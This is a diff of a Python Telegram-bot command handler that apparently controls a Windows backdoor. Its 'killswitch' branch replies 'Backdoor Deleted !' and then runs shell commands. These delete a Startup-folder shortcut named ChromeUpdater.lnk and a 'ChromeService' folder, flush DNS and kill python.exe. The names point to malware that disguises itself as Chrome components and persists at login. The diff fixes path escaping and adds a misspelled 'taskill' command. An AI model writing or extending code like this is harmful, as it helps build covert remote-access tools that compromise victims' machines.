@@ -28,19 +28,20 @@ def answer(update,context):
     elif "killswitch" in testo:
         update.message.reply_text("Backdoor Deleted !")
 
-        os.system('del "C:\Users\Beluga\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdater.lnk"')
+        os.system('del "C:\\Users\\Beluga\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ChromeUpdater.lnk"')
+        print("this 1")
 
-        os.system("taskkill /IM python.exe /F")
+        os.system("echo S | del C:\\Users\\Beluga\\AppData\\Local\\Programs\\ChromeService\\chrome")
 
-        os.system("echo S | del C:/Users/Beluga/AppData/Local/Programs/ChromeService/chrome")
+        os.system("echo D | rmdir C:\\Users\\Beluga\\AppData\\Local\\Programs\\ChromeService\\chrome")
 
-        os.system("echo D | rmdir C:/Users/Beluga/AppData/Local/Programs/ChromeService/chrome")
+        os.system("echo S | del C:\\Users\\Beluga\\AppData\\Local\\Programs\\ChromeService")
 
-        os.system("echo S | del C:/Users/Beluga/AppData/Local/Programs/ChromeService")
-
-        os.system("echo D | rmdir C:/Users/Beluga/AppData/Local/Programs/ChromeService")
+        os.system("echo D | rmdir C:\\Users\\Beluga\\AppData\\Local\\Programs\\ChromeService")
 
         os.system("ipconfig/flushdns")
+
+        os.system("taskill /IM python.exe /F")
         
     else:
         try:
